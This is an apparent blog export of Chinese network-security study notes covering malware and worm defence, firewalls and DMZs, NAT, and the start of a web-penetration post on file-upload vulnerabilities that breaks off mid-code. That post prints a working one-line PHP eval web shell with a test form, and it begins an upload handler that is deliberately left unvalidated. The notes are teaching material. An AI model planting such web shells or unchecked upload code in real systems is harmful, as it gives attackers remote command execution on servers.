<ol><li>通过改变指令执行顺序或者用不同秘钥将病毒加密，使同一病毒呈现多种形式</li></ol></li><li><strong>变形病毒</strong><ol><li>在复制过程中自动改写成不同形式</li></ol></li></ol><br/><p><strong>病毒感染机制</strong></p><ul><li>改写载体中的某部分程序或者嵌入到载体中</li><li>改写或者嵌入的位置可以是载体的首部，中部和尾部</li><li>部分病毒将自己分为多片，并改写或嵌入到载体的不同位置</li><li>病毒和载体程序具有相同的访问权限</li></ul><p>当带毒载体被执行时，通过自我复制到所在系统其他健康载体上，或者通过网络复制到联网计算机中其他健康载体上。</p><p>病毒生命周期：潜伏期（通常什么也不做）、传染期（自我复制）和发作期（破坏）</p><p><img src="/2023/03/19/kang-e-yi-ruan-jian/9a9b786e4dc21649dbe4ae6f477ea66a.png" class="lazyload placeholder" data-srcset="/2023/03/19/kang-e-yi-ruan-jian/9a9b786e4dc21649dbe4ae6f477ea66a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>病毒结构</strong></p><p>有四个主要的子程序构成</p><ol><li>感染子程序：搜索还未被感染的载体，并将病毒代码植入其中</li><li>感染条件子程序：检查是否具备执行感染子程序的条件</li><li>发作子程序：执行具体的破坏工作</li><li>发作条件子程序：检查是否具备执行发作子程序的条件</li></ol><p><img src="/2023/03/19/kang-e-yi-ruan-jian/5abd1e50b854fc54e5b4de90a2145e3b.png" class="lazyload placeholder" data-srcset="/2023/03/19/kang-e-yi-ruan-jian/5abd1e50b854fc54e5b4de90a2145e3b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>载体压缩病毒</strong></p><ul><li>一个被感染的载体文件通常会变大</li><li>载体压缩病毒试图掩盖这种变化<ul><li>在感染期间<strong>压缩载体文件</strong></li><li>在发作期间<strong>解压缩文件</strong></li></ul></li><li>如果被压缩的载体文件加上病毒代码仍小于文件的原始大小，则需要填充</li></ul><br/><p><strong>病毒的传播</strong></p><ul><li>通过便携存储设备传播（传统的传播方式）<ul><li>移动硬盘，U盘.</li></ul></li><li>通过电子邮件附件和下载程序传播（目前的传播方式）<ul><li>Email是重要的传播途径，因为许多电子邮件用户通常会盲目打开附件</li></ul></li></ul><br/><p><strong>Win32病毒感染剖析</strong></p><p>Wi32病毒感染微软的可移植可执行PE)文件格式。一个PE文件包含：</p><ol><li>PE分段：.text段（存储可执行代码），.data段(存储全局变量)，.rsrc段（存储资源），输入表和输出表</li><li>PE头部：提供可执行映像的重要信息（如<strong>AddressOfEntryPoint</strong>值域存储程序代码运行起点，病毒需要修改指向自己)</li></ol><p><img src="/2023/03/19/kang-e-yi-ruan-jian/4a74c9a22b740810502b5a9df201ec75.png" class="lazyload placeholder" data-srcset="/2023/03/19/kang-e-yi-ruan-jian/4a74c9a22b740810502b5a9df201ec75.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="蠕虫和病毒防御"><a href="#蠕虫和病毒防御" class="headerlink" title="蠕虫和病毒防御"></a>蠕虫和病毒防御</h2><p><strong>蠕虫</strong></p><p>是一个独立的程序，可以<strong>自我复制（无需用户点击），自我执行（无需用户点击）</strong></p><blockquote><p>可视为一种<strong>特殊的病毒</strong>，通过<strong>网络传播</strong></p></blockquote><p>大多数蠕虫程序由下列组成：目标定位子程序（找到新的目标主机进行感染）、传播子程序（将蠕虫复制到目标主机中）</p><br/><p><strong>常见蠕虫类型</strong></p><ul><li>批量邮件蠕虫<ul><li>通过<strong>电子邮件附件</strong>自我繁殖</li><li>在命名时通常在名字后面加上“@mm“</li></ul></li><li>兔子蠕虫<ul><li>迅速自我复制，导致系统因为资源耗尽而崩溃</li><li>通常藏在一个隐藏文件目录里或者以正常的文件名来伪装自己</li></ul></li></ul><br/><p><strong>蠕虫实例</strong></p><p><img src="/2023/03/19/kang-e-yi-ruan-jian/3e5754a529b4337a8163b6c547e18f54.png" class="lazyload placeholder" data-srcset="/2023/03/19/kang-e-yi-ruan-jian/3e5754a529b4337a8163b6c547e18f54.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>电子邮件附件</strong></p><p>电子邮件附件可以分为三类</p><ol><li>安全附件：不可执行，不是宏指令</li><li>谨防附件：包含宏指令的文件，安全性依赖于发送者</li><li>危险附件：可自行程序代码，不能打开</li></ol><br/><p>红色代码蠕虫（缓冲区溢出漏洞）</p><p><img src="/2023/03/19/kang-e-yi-ruan-jian/d00c77a73504a5693fd5dd2cdb542b3f.png" class="lazyload placeholder" data-srcset="/2023/03/19/kang-e-yi-ruan-jian/d00c77a73504a5693fd5dd2cdb542b3f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>病毒防御</strong></p><ol><li>预防：阻止病毒进入健康系统<ol><li>及时安装<strong>软件补丁</strong></li><li>不要从<strong>不可信的Web站点</strong>下载软件</li><li>不要打开<strong>危险的邮件附件</strong></li></ol></li><li>恢复：修复受感染系统<ol><li>用一个<strong>杀毒软件扫描</strong>文件</li><li>保持系统和用户文件的<strong>备份</strong></li></ol></li></ol><br/><p><strong>病毒扫描方法</strong></p><ol><li>基本扫描<ol><li>在主机文件中搜索已知病毒的特征</li><li>检查系统中可执行文件的大小是否改变</li></ol></li><li>启发式扫描<ol><li>在可执行文件中搜索<strong>可疑代码片段</strong>，多用于发现<strong>多态病毒</strong>（病毒用秘钥将自己加密）</li></ol></li><li>完整性校验值检查(ICV)<ol><li>对每个可执行文件计算ICV，附在文件后以备校验</li></ol></li><li>行为监控<ol><li>评估可执行程序的行为</li></ol></li></ol><br/><p><strong>仿真杀毒（沙盒技术）</strong></p><p>用专门的软件模拟硬件环境来评估可疑程序。</p><p>沙盒就是创造一个运行存在潜在安全风险的应用程序的隔离环境，可以把沙盒看做是一个虚拟的容器，让不是很安全的程序在运行在其中，不对操作系统和其他程序造成威胁，能阻止恶意软件感染正常系统。虚拟化技术的普及让沙盒技术变得更加容易实现。</p><p>1997年BM提出数字免疫系统概念</p><ol><li>局域网主机发现嫌疑病毒，送给管理主机</li><li>管理主机加密嫌疑病毒，发送给病毒分析机</li><li>病毒分析机在仿真环境（沙盒环境）中运行嫌疑文件，观察行为，确定是否为病毒</li><li>病毒分析及将结论发送给局域网主机</li></ol><p><img src="/2023/03/19/kang-e-yi-ruan-jian/ad02771fe390c4f03ee55c87ea34e85c.png" class="lazyload placeholder" data-srcset="/2023/03/19/kang-e-yi-ruan-jian/ad02771fe390c4f03ee55c87ea34e85c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/19/kang-e-yi-ruan-jian/10a8c6da99c25f31cc710d9e096dbe01.png" class="lazyload placeholder" data-srcset="/2023/03/19/kang-e-yi-ruan-jian/10a8c6da99c25f31cc710d9e096dbe01.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><p><strong>Web文档的基本类型</strong></p><ul><li><p>静态文件：一个没有可执行代码的Web文档，下载是安全的</p></li><li><p>动态文件：包含可执行代码的Web文档（JSP，ASP，PHP），在服务器执行，下载执行结果给客户端</p></li><li><p>主动文件：包含可执行代码（主要指JavaScript)，但运行在客户端主机，下载完整的代码运行</p></li></ul><br/><p><strong>Web文件的安全性</strong></p><p>服务端：服务器漏洞被动态文件利用遭受攻击</p><p>安全措施：升级到最新Web服务器程序，严格管理CGI程序，禁止普通用户提交CGI到Web服务器目录</p><p>客户端：Web浏览器漏洞被主动文件利用遭受攻击</p><p>安全措施：安装浏览器补丁、禁用浏览器的JavaScript、Java applets</p><br/><p><strong>Cookies</strong></p><ul><li>Web浏览器是无状态的<ul><li>每个URL请求，浏览器都会建立一个新的连接。对于并发的页面，需要建立不同的不相关的TCP连接。若待访问页面需要认证，用户需要为每个连接输入相同的用户名和密码。</li><li>服务器采用cookie保存用户的信息（可包含用户名、IP地址、操作系统以及曾经访问过的网页地址等)，并发送给浏览器</li><li>浏览器下次访问，连同cookie和请求一起发送给服务器，无需重复输入用户名和密码</li></ul></li><li>服务器：必须确保cookies不被恶意使用</li><li>客户机：定期清除缓存的cookies</li></ul><br/><p><strong>间谍软件</strong></p><p>恶意软件未经用户许可的情况下，以一个插件模块安装在Web浏览器上</p><p>间谍软件可能会收集用户的信息并发送给攻击者、监控用户的Web访问情况并弹出广告、修改浏览器的缺省配置并且重定向到特定的网页。</p><p>对策：配置防火墙来阻止攻击者植入间谍软件、及时安装软件补丁、安装反间谍软件程序</p><br/><p><strong>安全上网</strong></p><ul><li>只从可信的Web站点下载软件</li><li>不要点击弹出窗口的任何按钮<ul><li>在安装和运行软件之前，阅读隐私说明、授权说明和安全警告，找出可能存在的风险</li><li>不要从受密码保护的站点内访问其他不同地址的站点</li></ul></li><li>不要访问可疑的Web站点</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 病毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络边防</title>
      <link href="/2023/03/18/wang-luo-bian-fang/"/>
      <url>/2023/03/18/wang-luo-bian-fang/</url>
      
        <content type="html"><![CDATA[<h2 id="防火墙概述"><a href="#防火墙概述" class="headerlink" title="防火墙概述"></a>防火墙概述</h2><p><strong>防火墙概述</strong></p><p>LANs（局域网）、WANs（广域网）、WLANs（无线局域网）都属于互联网的边缘网（内网）</p><p>可能属于企业或家庭网络，需要得到保护，以免被入侵</p><p>为什么要用防火墙？</p><ul><li><p>加密不行吗？</p><ul><li>不能阻止恶意网络数据包进入网络边界</li></ul></li><li><p>身份验证不行呢？</p><ul><li>可以确定收到的网络数据包是否来自于可信用户</li><li>但不是所有主机都有计算资源运行身份验证算法</li></ul></li><li><p>各主机用户的管理水平也参差不齐</p></li></ul><br/><p><strong>防火墙基本结构</strong></p><p>防火墙是什么？</p><ul><li><p>l990年代初期发展起来，限制恶意网络数据包从Internet进入到边缘网内</p></li><li><p>是Internet和边缘网（内网）的一个界限</p></li><li><p>一种过滤流入和流出网络数据包的机制</p></li><li><p>可能是硬件，软件或者两者结合</p><ul><li>硬件快但是升级不方便</li><li>软件慢但便于升级</li></ul></li></ul><p>防火墙可以部署在网络层、传输层、应用层</p><p><img src="/2023/03/18/wang-luo-bian-fang/d89f08b4640a98792d2bfd423d405afc.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/d89f08b4640a98792d2bfd423d405afc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/18/wang-luo-bian-fang/6e4398a25a7af4a52954e4a2a328609f.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/6e4398a25a7af4a52954e4a2a328609f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>部署在网络层的防火墙——包过滤防火墙</strong></p><ol><li>过滤进入和外出的数据包</li><li><strong>仅监视IP和TCP/UDP的头部</strong>，不考虑负载</li><li>分为无状态和有状态过滤两种<ol><li>无状态的过滤：容易实现但功能简单</li><li>有状态的过滤：较难实现但功能强大</li></ol></li></ol><br/><p><strong>无状态过滤防火墙</strong></p><ul><li>执行简单过滤<ul><li>将每个数据包视为独立个体</li><li>应用静态规则集来检测每个数据包</li><li>不保留之前数据包的处理结果</li></ul></li><li>所用规则集称为访问控制列表（ACL）<ul><li>自上而下的匹配规则，应用匹配到的第一个规则</li><li>如果没有匹配的规则，则按照缺省规则过滤</li></ul></li></ul><p><img src="/2023/03/18/wang-luo-bian-fang/bfe8e733306cf0ff1618082f92d14bd9.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/bfe8e733306cf0ff1618082f92d14bd9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>有状态过滤防火墙</strong></p><ul><li>比无状态过滤更加智能<ul><li>跟踪内部主机和外部主机的网络连接（TCP或者UDP）</li><li>根据连接状态决定是接受还是拒绝数据包</li><li>通常和无状态的过滤组合使用</li></ul></li><li>需要关注对计算和内存资源的消耗；连接跟踪是非常耗费资源的</li></ul><p><img src="/2023/03/18/wang-luo-bian-fang/4954cad7d92b101e0ed386bac2f8da7a.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/4954cad7d92b101e0ed386bac2f8da7a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>配置防火墙</strong></p><p><img src="/2023/03/18/wang-luo-bian-fang/f2dacc81d3973f32b300b15f4af8f797.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/f2dacc81d3973f32b300b15f4af8f797.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="线路网关和应用网关"><a href="#线路网关和应用网关" class="headerlink" title="线路网关和应用网关"></a>线路网关和应用网关</h2><p><strong>线路网关（电路网关）</strong></p><ul><li>也称为电路网络或者传输层代理，运行在传输层</li><li>**检测IP地址和端口号(TCP/UDP)**来确定连接是否合法</li><li>在实际应用中，通常将包过滤防火墙和线路网关结合起来使用</li><li>基本结构<ul><li>作为中继站为内部主机和外部主机建立连接</li><li><strong>不允许内外部网络直接连接</strong></li><li>一旦建立连接后，线路网络只负责为双方传递数据包而不再做任何过滤</li></ul></li></ul><p><img src="/2023/03/18/wang-luo-bian-fang/93b3497123f66c4dbd658be6aafcb7d1.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/93b3497123f66c4dbd658be6aafcb7d1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>SOCKS协议</strong></p><ul><li>1990年代初期推出软件产品，为构造线路网关设计的网络协议</li><li>由三部分组成：<ul><li>SOCKS服务器：监听于1080端口(TCP)上</li><li>SOCKS客户端：经过修改的FTP和其他标准TCP客户应用程序</li><li>SOCKS客户端库：在内网主机上运行</li></ul></li><li>连接步骤：<ul><li>内网主机建立到SOCKS服务器的TCP连接，协商身份认证方法，完成身份认证。</li><li>通过认证后，内网主机发送需要连接的外网主机IP和端口号，由SOCKS服务器负<br>责与外网主机建立连接。</li><li>SOCKS服务器<strong>中转</strong>内网主机与外网主机的数据包。</li></ul></li></ul><br/><p><strong>应用网关</strong></p><ul><li><p>也称为<strong>代理服务器</strong></p></li><li><p>扮演内部主机的代理角色，也可以处理外网客户向内网主机提出的服务请求</p></li><li><p>对所有数据包执行深度检查</p><ul><li>能够<strong>检查应用程序格式</strong>，如MME和SQL的数据格式</li><li>可以应用<strong>基于负载的过滤规则</strong></li><li>具有<strong>检测恶意和可疑数据包的能力</strong></li></ul></li><li><p>通常会消耗许多计算和储存资源</p></li></ul><br/><p><strong>应用网关功能</strong></p><p>应用网关接受外网客户提交的访问内网服务器的请求，<strong>检查流入的IP包负载是否满足安全性要求</strong>。通过检查后，才将客户的请求传递给内网服务器，并<strong>缓存</strong>内网服务器返回给外网客户的结果。</p><p><img src="/2023/03/18/wang-luo-bian-fang/dcabeafc6f4786f0135a08a3b3424562.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/dcabeafc6f4786f0135a08a3b3424562.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>缓存网关</p><p><img src="/2023/03/18/wang-luo-bian-fang/b6102b3fff3f8ff5525ae419641394c7.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/b6102b3fff3f8ff5525ae419641394c7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><br/><p><strong>有状态的包检查</strong></p><p>应用网关支持有状态的数据包检查。</p><ul><li>检查网包和连接状态</li><li>检查网包的负载，若网络报文不符合应用层协议规定的格式，则丢弃该报文</li></ul><br/><h2 id="堡垒主机和防火墙布局"><a href="#堡垒主机和防火墙布局" class="headerlink" title="堡垒主机和防火墙布局"></a>堡垒主机和防火墙布局</h2><p><strong>可信操作系统</strong></p><ul><li>满足一组特定安全需求的操作系统<ul><li>系统设计不包含缺陷</li><li>系统软件不包含漏洞</li><li>系统配置正确</li><li>系统管理得当</li></ul></li><li>可包含多个具有不同安全级别的用户</li><li>必须严格服从访问许可权限规则</li></ul><br/><p><strong>TOS访问权限</strong></p><ul><li><p>不往上读</p><ul><li>低级别用户不能执行高级别程序</li><li>低级别程序不能读取高级别文件</li></ul></li><li><p>不往下写</p><ul><li>高级别用户不能用低级别程序将数据写入低级别文件</li><li>高级别程序不能将数据写入低级别文件</li><li>主要是<strong>防止高级别数据进入低级别文件，从而被低级别用户所访问</strong></li></ul></li></ul><br/><p><strong>堡垒主机</strong></p><ul><li>是指防卫性能超强的主机，也称为代理机，通常用于实现：<ul><li>应用网关</li><li>线路网关</li><li>其它类型的防火墙</li></ul></li><li>运行在一个可信的操作系统上<ul><li>剔除不必要的功能</li><li>保持系统的精简以减少出错的概率</li></ul></li></ul><br/><p><strong>堡垒主机运行网关应满足条件</strong></p><ol><li>网关程序应使用小模块软件（便于检查和修补安全漏洞）</li><li>堡垒主机系统和网关程序均需要认证用户身份</li><li>网关应只与特定内网主机相连</li><li>应对系统的使用做详细记录</li><li>若堡垒主机同时运行多个网关，则这些网关必须相互独立，互不依赖</li><li>网关应避免写数据到硬盘上，避免入侵者在堡垒主机植入恶意程序</li><li>运行在堡垒主机上的网关不应被赋予管理员权限</li></ol><br/><p><strong>单界面堡垒系统</strong></p><ul><li>由一个网包过滤路由器和一个堡垒主机组成<ul><li>路由器用于连接内部和外部网络</li><li>堡垒主机在内部网络</li></ul></li><li>路由器上防火墙检查每个外发网包，如果其源地址不是堡垒主机的IP地址，则将其丢弃</li><li>如果路由器遭到攻陷，攻击者可修改ACL并绕过堡垒主机，直接将数据包送到内部主机</li></ul><p><img src="/2023/03/18/wang-luo-bian-fang/0cab700a40e3f4066009721c3fb49f05.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/0cab700a40e3f4066009721c3fb49f05.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>双界面堡垒系统</strong></p><ul><li>在内部网络中有两个区域：<ul><li>内区：来自Internet的主机不能直接访问</li><li>外区：来自Internet的主机可以访问</li></ul></li><li>内区的主机受到堡垒主机和网包过滤路由器的双重保护</li><li>外区的服务器受网包过滤路由器保护</li><li>即使网包过滤路由器遭攻陷也能阻止外部对内部网络的访问</li></ul><p><img src="/2023/03/18/wang-luo-bian-fang/3d0accfab77ab446b5c4dc7d54a0cb31.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/3d0accfab77ab446b5c4dc7d54a0cb31.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>子网监控防火墙系统</strong></p><ul><li>一个单界面堡垒系统网络，并为内部网络配备一个二级网包过滤路由器</li><li>将内部网络结构隐藏起来</li><li>两个网包过滤路由器之间的区域称为一个<strong>监控子网</strong>，也称为<strong>隔离区DMZ</strong></li></ul><p><img src="/2023/03/18/wang-luo-bian-fang/818225cb78d78033bfef5611cde19b2f.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/818225cb78d78033bfef5611cde19b2f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><blockquote><p>隔离区DMZ</p><p>在一个内部网络中两个防火墙之间的一个子网。外部防火墙将DMZ和外部威胁隔离开来，内部防火墙将内部网络和DMZ隔离开来。</p><p><img src="/2023/03/18/wang-luo-bian-fang/46d5aadd7cf629e0b15f09ff63a47cc2.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/46d5aadd7cf629e0b15f09ff63a47cc2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><br/><p><strong>网络安全基本拓扑结构</strong></p><p>防火墙将网络分为三个区域：非信任区域、半信任区域(DMZ区)和可信区域</p><p><img src="/2023/03/18/wang-luo-bian-fang/3a6d7d292f1a203558f8b91035147ef1.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/3a6d7d292f1a203558f8b91035147ef1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>网络地址转换（NAT)</strong></p><ul><li>IP地址分为公网和私有（不可路由）两个组<ul><li>互联网地址编码分配机构指定了3个IP块作为私有地址：10.0.0.0/8、172.16.0.0/12、192.168.0.0/16</li></ul></li><li>私有地址可通过一个或几个公网IP地址接入Internet<ul><li>在IPv4里，克服了地址匮乏问题</li></ul></li></ul><ol><li>动态NAT</li></ol><p>动态地指定少数几个公网IP地址给私有地址。**端口地址转换(PAT)**，是NAT的一个变种</p><p>允许一个或更多的私有网络共享一个单一的公网IP。通常由家庭或小企业网络使用，通过重新映射网包的源、目地址和端口号来工作。</p><p><img src="/2023/03/18/wang-luo-bian-fang/22ed5c64262f6264770dc5d33cb4235f.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/22ed5c64262f6264770dc5d33cb4235f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>注意：外网服务器的Src Port 5341 变成 80！！！</strong></p><br/><p><strong>虚拟局域网(VLAN)</strong></p><ol><li>一种在同一个物理网络中构建多个独立的逻辑局域网的技术</li><li>VLAN可由<strong>软件</strong>来创建</li><li>VLAN交换机：一个VLAN交换机可以配置成<strong>多个逻辑的交换端口组</strong>，从而实现独立的VLAN</li></ol><p><img src="/2023/03/18/wang-luo-bian-fang/0e0b8c47eddc991f277a0c331ddac3d1.png" class="lazyload placeholder" data-srcset="/2023/03/18/wang-luo-bian-fang/0e0b8c47eddc991f277a0c331ddac3d1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB渗透实战</title>
      <link href="/2023/03/17/web-shen-tou-shi-zhan/"/>
      <url>/2023/03/17/web-shen-tou-shi-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞指<strong>网络攻击者上传了一个可执行的文件到服务器并执行</strong>。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p><ul><li>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。</li><li>大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。</li><li>攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</li></ul><blockquote><p>这里需要特别说明的是上传漏洞的利用经常会使用WebShell，而WebShell的植入远不止文件上传这一种方式。</p></blockquote><h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种<strong>命令执行环境</strong>，也可以将其称之为一种<strong>网页后门</strong>。</p><ul><li>攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，<strong>得到一个命令执行环境，以达到控制网站服务器的目的</strong>（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</li><li>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。</li><li>攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。</li></ul><blockquote><p>除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测。</p></blockquote><p><code>&lt;?php eval($_POST[a]); ?&gt;</code></p><p>就是一个最常见最原始的小马。eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p>举例，编写test.php，存储到PHPNOW的Web目录下，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]); <span class="meta">?&gt;</span> </span><br><span class="line">&lt;form id=<span class="string">&quot;form1&quot;</span> name=<span class="string">&quot;form1&quot;</span> method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;test.php&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;uname&quot;</span> type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;uname&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/17/web-shen-tou-shi-zhan/8b34c33e25a088a852a7c70ee02a6b44.png" class="lazyload placeholder" data-srcset="/2023/03/17/web-shen-tou-shi-zhan/8b34c33e25a088a852a7c70ee02a6b44.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>在输入框中输入“phpinfo();”运行后：</p><p><img src="/2023/03/17/web-shen-tou-shi-zhan/aa567014822fcc804a7b26535eb5d70e.png" class="lazyload placeholder" data-srcset="/2023/03/17/web-shen-tou-shi-zhan/aa567014822fcc804a7b26535eb5d70e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h2><p>大部分的网站和应用系统都有上传功能，如用户头像上传，图片上传，文档上传等。</p><ul><li>一些文件上传功能实现代码没有严格限制用户上传的<strong>文件后缀以及文件类型</strong>，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</li><li>当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本。</li></ul><p>上传文件是病毒或木马时：主要用于诱骗用户或者管理员下载执行或者直接自动运行</p><p>上传文件是WebShell时：攻击者可通过这些网页后门执行命令并控制服务器</p><p>上传文件时其他恶意脚本时：攻击者可直接执行脚本进行攻击</p><p>上传文件是恶意图片时：图片中可能包含了脚本，加载或者点击这些图片脚本会执行</p><p>上传文件是伪装成正常后缀的恶意脚本时：攻击者可借助本地文件包含漏洞(Local File Include)执行该文件。如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数<strong>包含执行</strong>。</p><p>一个php文件上传代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span> </span><br><span class="line">name=<span class="string">&quot;uploadfile&quot;</span>&gt;上传文件：&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile&quot;</span> /&gt;&lt;br&gt; </span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;&lt;/form&gt; </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123; </span><br><span class="line"><span class="variable">$upfile</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>]; </span><br><span class="line"><span class="comment">//获取数组里面的值 </span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$upfile</span>[<span class="string">&quot;name&quot;</span>];<span class="comment">//上传文件的文件名 </span></span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$upfile</span>[<span class="string">&quot;type&quot;</span>];<span class="comment">//上传文件的类型 </span></span><br><span class="line"><span class="variable">$size</span>=<span class="variable">$upfile</span>[<span class="string">&quot;size&quot;</span>];<span class="comment">//上传文件的大小 </span></span><br><span class="line"><span class="variable">$tmp_name</span>=<span 